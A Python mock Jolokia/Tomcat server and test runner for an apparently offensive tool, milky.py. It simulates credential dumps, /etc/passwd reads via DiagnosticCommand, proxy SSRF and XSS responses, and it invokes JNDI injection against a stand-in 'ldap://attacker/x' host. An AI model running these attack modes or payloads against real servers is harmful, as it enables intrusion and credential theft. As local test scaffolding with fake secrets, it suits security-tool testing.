#!/usr/bin/env python3
"""Minimal mock Jolokia server for testing milky.py."""

import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

PORT = 18181

VERSION_RESPONSE = {
    "status": 200,
    "value": {
        "agent": "1.5.0",
        "protocol": "7.2",
        "config": {
            "allowedOrigin": "*",
            "proxyAllowedTargetHosts": [],
            "discoveryEnabled": False
        }
    }
}

LIST_RESPONSE = {
    "status": 200,
    "value": {
        "com.sun.management": {
            "type=DiagnosticCommand": {
                "op": {
                    "compilerDirectivesAdd": {},
                    "threadPrint": {},
                    "heapDump": {}
                },
                "attr": {},
                "class": "com.sun.management.DiagnosticCommandMBean"
            }
        },
        "Catalina": {
            "type=AccessLogValve,host=localhost,context=/": {
                "op": {},
                "attr": {
                    "pattern": {"type": "java.lang.String", "rw": True},
                    "directory": {"type": "java.lang.String", "rw": True},
                    "prefix": {"type": "java.lang.String", "rw": True},
                    "suffix": {"type": "java.lang.String", "rw": True},
                    "buffered": {"type": "boolean", "rw": True},
                    "fileDateFormat": {"type": "java.lang.String", "rw": True},
                    "asyncSupported": {"type": "boolean", "rw": True},
                    "checkExists": {"type": "boolean", "rw": True}
                },
                "class": "org.apache.catalina.valves.AccessLogValve"
            }
        },
        "Users": {
            "database=UserDatabase,type=UserDatabase": {
                "op": {},
                "attr": {"users": {"type": "java.lang.String", "rw": False}},
                "class": "org.apache.catalina.users.MemoryUserDatabase"
            }
        },
        "ch.qos.logback.classic": {
            "Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator": {
                "op": {
                    "reloadByURL": {"args": [{"type": "java.lang.String"}]},
                    "setLoggerLevel": {"args": [{"type": "java.lang.String"}, {"type": "java.lang.String"}]}
                },
                "attr": {},
                "class": "ch.qos.logback.classic.jmx.JMXConfigurator"
            }
        },
        "java.lang": {
            "type=Runtime": {
                "op": {},
                "attr": {
                    "VmName": {"type": "java.lang.String", "rw": False},
                    "SystemProperties": {"type": "javax.management.openmbean.TabularData", "rw": False}
                }
            },
            "type=Threading": {
                "op": {"dumpAllThreads": {}},
                "attr": {}
            }
        }
    }
}

SYSTEM_PROPS = {
    "status": 200,
    "value": {
        "java.home": "/usr/lib/jvm/java-11",
        "java.version": "11.0.20",
        "catalina.home": "/usr/local/tomcat",
        "catalina.base": "/usr/local/tomcat",
        "user.name": "tomcat",
        "os.name": "Linux",
        "java.class.path": "/usr/local/tomcat/lib/*",
        "spring.datasource.url": "jdbc:mysql://db:3306/appdb",
        "spring.datasource.password": "supersecret123"
    }
}

THREAD_DUMP = {
    "status": 200,
    "value": '"main" #1 prio=5 os_prio=0 tid=0x00007f cpu=120ms\n  java.lang.Thread.State: RUNNABLE\n  at sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)'
}

CREDS_USERS = {
    "status": 200,
    "value": 'ManagedUser[username="admin"], ManagedUser[username="deployer"]'
}

CREDS_PASS = {
    "admin":    {"status": 200, "value": "t0mcat_adm1n"},
    "deployer": {"status": 200, "value": "deploy@123"},
}

PROXY_RESPONSE = {
    "status": 500,
    "error": "java.net.ConnectException: Connection refused to 127.0.0.2:55555",
    "error_type": "java.net.ConnectException"
}

JMXCONF_RELOAD = {
    "status": 200,
    "value": None
}


class JolokiaMockHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass  # suppress access logs

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urlparse(self.path).path.rstrip("/")

        if path == "/jolokia/version":
            return self._json(VERSION_RESPONSE)

        if path == "/jolokia/list":
            return self._json(LIST_RESPONSE)

        if path == "/jolokia":
            return self._json(VERSION_RESPONSE)

        # read/.../SystemProperties
        if "SystemProperties" in path:
            return self._json(SYSTEM_PROPS)

        # exec/...DiagnosticCommand/threadPrint
        if "threadPrint" in path:
            return self._json(THREAD_DUMP)

        # read/.../users
        if path.endswith("/users"):
            return self._json(CREDS_USERS)

        # read/Users:database=UserDatabase,type=User,username="admin"/password
        if "type=User" in path and path.endswith("/password"):
            for uname, resp in CREDS_PASS.items():
                if uname in path:
                    return self._json(resp)
            return self._json({"status": 200, "value": "unknown"})

        # exec/...compilerDirectivesAdd/...  (file read)
        if "compilerDirectivesAdd" in path:
            # decode the !/ path encoding
            encoded = path.split("compilerDirectivesAdd/", 1)[-1]
            decoded = "/" + encoded.replace("!/", "/").lstrip("/")
            return self._json({
                "status": 200,
                "value": f"# mock content of {decoded}\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            })

        # XSS probe
        if "mimeType=text/html" in self.path:
            # reflect whatever is in the path as HTML
            body = f"<html>{self.path}</html>".encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # fallback version
        return self._json(VERSION_RESPONSE)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}

        mbean = body.get("mbean", "")
        op = body.get("operation", "")
        btype = body.get("type", "")
        target = body.get("target")

        # proxy SSRF test
        if target:
            return self._json(PROXY_RESPONSE)

        # JMXConfigurator.reloadByURL
        if "JMXConfigurator" in mbean and op == "reloadByURL":
            return self._json(JMXCONF_RELOAD)

        # thread dump via Threading MBean
        if "Threading" in mbean and op == "dumpAllThreads":
            return self._json(THREAD_DUMP)

        # AccessLogValve read
        if "AccessLogValve" in mbean and btype == "read":
            return self._json({
                "status": 200,
                "value": {
                    "pattern": "%h %l %u %t \"%r\" %s %b",
                    "directory": "logs",
                    "prefix": "localhost_access_log",
                    "suffix": ".txt",
                    "buffered": True,
                    "fileDateFormat": ".yyyy-MM-dd",
                    "asyncSupported": False,
                    "checkExists": False
                }
            })

        # AccessLogValve write
        if "AccessLogValve" in mbean and btype == "write":
            return self._json({"status": 200, "value": body.get("value")})

        return self._json({"status": 200, "value": "ok"})


def start_server():
    server = HTTPServer(("127.0.0.1", PORT), JolokiaMockHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server


if __name__ == "__main__":
    import subprocess, sys, time

    srv = start_server()
    base = f"http://127.0.0.1:{PORT}/jolokia"
    milky = [sys.executable, "milky.py", base]

    tests = [
        ("scan",  milky + ["scan"]),
        ("xss",   milky + ["xss"]),
        ("proxy", milky + ["proxy", "--target", "service:jmx:rmi:///jndi/ldap://attacker/x"]),
        ("jndi",  milky + ["jndi", "--target", "ldap://attacker/x"]),
        ("dump",  milky + ["dump"]),
        ("env",   milky + ["env"]),
        ("read",  milky + ["read", "-f", "/etc/passwd"]),
        ("creds", milky + ["creds"]),
    ]

    SEP = "=" * 60
    passed = failed = 0
    for name, cmd in tests:
        print(f"\n{SEP}\nTEST: {name}\n{SEP}")
        result = subprocess.run(cmd, capture_output=False, text=True)
        ok = result.returncode == 0
        status = "PASS" if ok else "FAIL"
        if ok:
            passed += 1
        else:
            failed += 1
        print(f"\n>>> {status}: {name} (exit {result.returncode})")

    print(f"\n{SEP}")
    print(f"Results: {passed} passed, {failed} failed")
    srv.shutdown()
